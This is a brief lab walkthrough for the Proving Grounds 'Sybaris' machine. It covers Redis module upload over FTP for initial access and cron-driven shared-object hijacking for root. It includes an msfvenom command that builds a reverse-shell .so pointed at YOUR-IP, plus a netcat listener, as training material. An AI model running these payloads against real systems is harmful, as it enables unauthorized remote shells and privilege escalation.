
# 🧪 Sybaris Walkthrough (Proving Grounds)

## 📌 Summary
Initial access through Redis and FTP, followed by privilege escalation via cron job abuse and shared object injection.

---

## 🚪 Initial Foothold: Redis + FTP

- **Redis Enumeration**
  - Reference: [Redis Pentesting - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
  - GitHub: [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

- **Exploitation Steps**
  1. Gain access to Redis and FTP.
  2. Upload `module.so` via FTP.
  3. Use this walkthrough for reference:
     [Initial foothold](https://medium.com/@vivek-kumar/offensive-security-proving-grounds-walk-through-sybaris-491b23545014)
  4. Used a bash reverse shell to port `6379`.

---

## ⚙️ Privilege Escalation (PE)

- **Cron Job Abuse**
  - Reference: [PE Walkthrough](https://medium.com/@SxEl/proving-grounds-sybaris-walkhtrough-ec32f39b9bcc)

- **Steps**
  1. Create `.so` payload:
     ```bash
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR-IP LPORT=6379 -f elf-so -o utils.so
     ```

  2. Upload `utils.so` to:
     ```
     /usr/local/lib/dev/utils.so
     ```

  3. This path is required by `/usr/bin/log-sweeper`.

  4. Open a netcat listener:
     ```bash
     nc -nlvp 6379
     ```

  5. Trigger the cron job by waiting or executing the binary.

---

## 🧠 Notes
- Target OS: Linux
- Exploited service: Redis (TCP 6379)
- Shell type: Bash reverse shell

